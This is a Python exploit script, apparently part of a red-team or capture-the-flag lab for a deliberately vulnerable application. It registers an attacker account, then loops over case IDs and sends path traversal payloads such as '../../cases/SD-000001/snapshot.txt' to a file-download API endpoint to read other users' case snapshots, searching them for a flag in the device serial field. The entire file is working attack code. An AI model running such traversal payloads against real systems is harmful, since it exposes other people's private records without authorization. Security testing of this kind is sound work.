import argparse
import sys

import requests

from _common import auth_headers, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN6_device_serial_"


def main():
    ap = argparse.ArgumentParser(description="Vuln 6: path traversal via /api/files/exports/download")
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--start", type=int, default=1, help="first case to read")
    ap.add_argument("--count", type=int, default=50, help="how many cases to read")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v6")
    ok(f"registered attacker {username}")

    info(f"walking cases SD-{args.start:06d}..SD-{args.start + args.count - 1:06d}")
    found = []
    for i in range(args.start, args.start + args.count):
        case = f"SD-{i:06d}"
        payload = f"../../cases/{case}/snapshot.txt"
        r = requests.get(
            f"{args.base}/api/files/exports/download",
            headers=auth_headers(token),
            params={"name": payload},
            timeout=5,
        )
        if r.status_code != 200:
            continue
        snapshot = r.text
        device_line = ""
        for line in snapshot.splitlines():
            if line.startswith("Device Serial:"):
                device_line = line.split(":", 1)[1].strip()
                break
        if TARGET_MARKER in device_line:
            found.append((case, device_line, snapshot))
            ok(f"hit {case} device_serial={device_line!r}")
        else:
            info(f"{case} readable but no matching flag (device_serial={device_line!r})")

    if not found:
        info("no flag found in walked range")
        sys.exit(2)

    for case, device, _ in found:
        ok(f"flag from {case}: {device}")


if __name__ == "__main__":
    main()
